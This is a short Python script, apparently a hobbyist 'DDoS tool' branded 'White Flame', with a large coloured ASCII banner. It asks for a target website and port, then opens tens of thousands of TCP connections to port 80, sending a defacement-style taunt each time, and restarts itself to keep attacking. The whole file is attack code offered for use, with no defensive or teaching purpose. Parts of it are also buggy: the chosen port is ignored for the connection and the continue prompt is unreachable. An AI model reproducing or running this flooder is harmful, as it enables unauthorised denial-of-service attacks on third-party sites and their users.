# TOOLS DDOS BY Wambua
import time
import socket
import os
import sys
# import string
# The white flame tools
baner = """
The White Flame is here...\033[38;5;208m$\033[0m
\033[38;5;208m                         $%$%\033[0m
\033[38;5;208m                        $$%$$$\033[0m
\033[38;5;208m                      %$$$$|%|:\033[0m
\033[38;5;208m                     %$$$$\033[0m\033[38;5;226m::\033[0m\033[38;5;208m$$$$\033[0m
\033[38;5;208m                    %$$$$\033[0m\033[38;5;226m:::\033[0m\033[38;5;208m$$$$$$\033[0m
\033[38;5;208m                  %$$$$\033[0m \033[38;5;226m::::\033[0m\033[38;5;226m:;\033[0m\033[38;5;208m$$$$$$\033[0m
\033[38;5;208m                %$$$$\033[0m\033[38;5;226m::::;;;\033[0m\033[38;5;226m::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m              %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34m$$$\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m             %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34m%$$$$%#\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m             %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34m$$$$###@\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m             %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34m@@@@@!!@@\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m             %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34m$###$**%(*)\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m            %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34m8888888898888\033[0m\033[38;5;226mp::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m           %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34m999999%99999999\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m          %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34m777777#|877777777\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m4$$$$$\033[0m
\033[38;5;208m         %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34mNNNNNnnnnnnn86666666\033[0m \033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m        %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34m##############8555555\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m       %$$$$ \033[0m\033[38;5;226m;::::::\033[0m\033[34mbbbbbbbbbbbbbbbb8444444\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m       %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34mhhhhhhhhhhfyyyyyff8333333\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m       %$$$$\033[0m\033[38;5;226m;::::::\033[0m\033[34meeeeeeeeeeeeeeeeeeee822222\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m       %$$$$\033[0m\033[38;5;226m::::::;\033[0m\033[34mssssssssssssssssssssss811111\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m       #$$$$\033[0m\033[38;5;226m:::::::\033[0m\033[34m#@@@####3333335444444444t800\033[0m\033[38;5;226m::::::;\033[0m\033[38;5;208m$$$$$\033[0m
\033[38;5;208m        #$$$$\033[0m\033[38;5;226m:::::::\033[0m\033[34mrrrrrrrrrrrrrrrrrrrrrrrrrrr\033[0m\033[38;5;226m;::::::\033[0m\033[38;5;208m$$$$$\033[0m
\033[1;96m|###################################################################|
\033[1;96m|###|               Author By : Wambua                          |###|
\033[1;96m|###|               code      : Python3                         |###|
\033[1;96m|###|               Team      : White Flame EANGLE              |###|
\033[1;96m|###################################################################|
"""
print(baner)


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


curdir = os.getcwd()
print("\033[1;91minput web url \033[1;95m[ex : www.Example.com ]")
host = input("\033[1;94mWFE@root : ")
print("\033[1;91minput port \033[1;95m[ex : 8080 ]")
port = input("\033[1;94mWFE@root : ")
if port == "":
    port = 80
port = int(port)
connect = 50000
ip = socket.gethostbyname(host)
print("\033[1;91m Attacking \033[1;93m[" + host + "]")
print("\033[1;91m Attack to target ip \033[1;93m[" + ip + "]" + "\033[1;91m inbound")
message = b"WHITE FLAME, THE FLAMING EANGLE SYSTEM WAS HERE..."
print("\033[1;91mFIRE..............................")


def dos():
    # pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
    except socket.error:
        print("\033[1;91m ...no connection to [" + ip + "] ...")
    print("\033[1;92m ...start sending payloads to [" + ip + "] ...")
    ddos.close()


for i in range(1, connect):
    try:
        dos()
    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit()
print("Ddos is stopping.........")
if __name__ == "__main__":
    restart_program()
    answer = input("Do you want to continue DDoS ??? Type 'fire'...")
    if answer.strip() in "y Y fire Fire FIRE".split():
        restart_program()
    else:
        os.system(curdir+"main.py")
